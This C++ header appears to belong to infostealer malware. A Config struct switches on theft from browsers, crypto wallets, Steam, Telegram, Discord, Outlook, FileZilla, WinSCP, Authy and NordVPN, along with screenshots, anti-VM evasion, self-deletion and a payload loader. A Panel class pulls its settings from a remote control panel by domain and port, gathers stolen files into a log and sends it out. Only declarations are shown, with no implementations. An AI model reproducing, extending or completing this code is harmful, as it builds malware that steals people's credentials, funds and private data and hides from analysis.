#pragma once
struct Config
{
	bool bChromium = false;
	bool bGecko = false;
	bool bEdge = false;
	bool bHistory = false;
	bool bSysInfo = false;
	bool bScreenshot = false;
	bool bCryptoWallets = false;
	bool bSteam = false;
	bool bTelegram = false;
	bool bDiscord = false;
	bool bJabber = false;
	bool bFoxmail = false;
	bool bOutlook = false;
	bool bFileZilla = false;
	bool bWinScp = false;
	bool bAuthy = false;
	bool bNordVpn = false;
	unsigned long long MaxFilesSize = 0;
	bool bAntiVm = false;
	bool bSelfDel = false;
	string FileGrabberConfig = string();
	string LoaderConfig = string();
	string IP = string();
	string Country = string();
};

class Panel
{
private:
	string panelDomain, uid;
	DWORD panelPort;
	string logData;
public:
	Panel() {}
	Panel(string domain, DWORD port, string uid)
	{
		this->panelDomain = domain;
		this->panelPort = port;
		this->uid = uid;
	}
	Config GetConfig();
	void AddFile(string outputName, string fileData);
	void AddFileFromDisk(string path, string outputName);
	bool AddFiles(string path, string mask, string output);
	void BuildLog();
	bool SendLog();
};

